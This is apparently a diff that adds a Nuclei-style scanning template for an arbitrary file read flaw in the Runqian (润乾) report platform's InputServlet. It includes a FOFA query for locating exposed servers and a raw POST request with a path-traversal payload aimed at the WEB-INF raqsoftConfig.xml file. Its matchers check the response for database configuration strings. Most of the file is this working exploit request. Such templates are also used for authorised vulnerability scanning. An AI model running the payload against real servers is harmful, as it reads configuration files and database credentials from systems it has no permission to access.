@@ -1,0 +1,32 @@
+id: runqian-file-read
+
+info:
+  name: 润乾报表平台InputServlet组件任意文件读取漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="润乾报表"
+      润乾报表平台InputServlet组件在文件访问控制逻辑中存在权限校验缺陷，攻击者可通过构造特定路径参数读取服务器任意文件内容。该漏洞可能被用于获取系统配置文件、数据库凭证等敏感信息，或通过读取Web目录结构实施后续攻击。
+  tags: 润乾报表平台
+
+http:
+- raw:
+  - |
+    POST /InputServlet?action=13 HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Connection: close
+
+    file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'DB'
+  - type: word
+    part: body
+    words:
+    - 'name'
